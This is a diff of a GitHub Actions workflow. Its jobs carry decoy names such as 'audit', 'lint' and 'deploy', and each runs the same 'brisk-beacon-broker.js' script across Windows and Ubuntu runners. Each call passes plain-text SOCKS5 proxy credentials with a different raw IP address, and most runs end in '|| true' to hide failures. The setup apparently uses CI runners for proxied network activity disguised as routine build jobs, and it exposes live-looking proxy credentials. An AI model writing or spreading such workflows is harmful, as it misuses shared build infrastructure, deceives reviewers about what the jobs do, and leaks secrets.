@@ -8,8 +8,35 @@ on:
       - 'package.json'
 
 jobs:
-  audit_windowslatest_node_fun:
-    runs-on: windows-latest
+  deploy_ubuntu2004_bun_hydrant:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
+          run: |
+            bun install && bun run brisk-beacon-broker.js "socks5://dcswarup:webshare@45.39.5.116:6554" || true
+
+  review_windows2022_node_futon:
+    runs-on: windows-2022
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          shell: pwsh
+          run: |
+            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@45.38.114.156:6069"
+
+  analyze_windows2025_node_release:
+    runs-on: windows-2025
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -20,10 +47,10 @@ jobs:
         - name: Run Task
           shell: pwsh
           run: |
-            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@45.38.111.37:5952"
+            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@92.112.91.225:6460"
 
-  check_windows2022_node_institute:
-    runs-on: windows-2022
+  format_ubuntulatest_node_depot:
+    runs-on: ubuntu-latest
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -32,45 +59,5 @@ jobs:
           with:
             node-version: 18
         - name: Run Task
-          shell: pwsh
           run: |
-            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@64.137.103.205:6793"
-
-  lint_ubuntulatest_bun_ethyl:
-    runs-on: ubuntu-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Bun
-          uses: oven-sh/setup-bun@v2
-          with:
-            bun-version: latest
-        - name: Run Task
-          run: |
-            bun install && bun run brisk-beacon-broker.js "socks5://dcswarup:webshare@107.174.4.205:6174" || true
-
-  analyze_ubuntu2404_node_breastplate:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 22
-        - name: Run Task
-          run: |
-            npm install && node brisk-beacon-broker.js "socks5://dcswarup:webshare@23.95.150.40:6009" || true
-
-  compile_ubuntu2004_node_cow:
-    runs-on: ubuntu-20.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 20
-        - name: Run Task
-          run: |
-            npm install && node brisk-beacon-broker.js "socks5://dcswarup:webshare@45.39.96.138:5551" || true
+            npm install && node brisk-beacon-broker.js "socks5://dcswarup:webshare@195.40.71.181:6364" || true
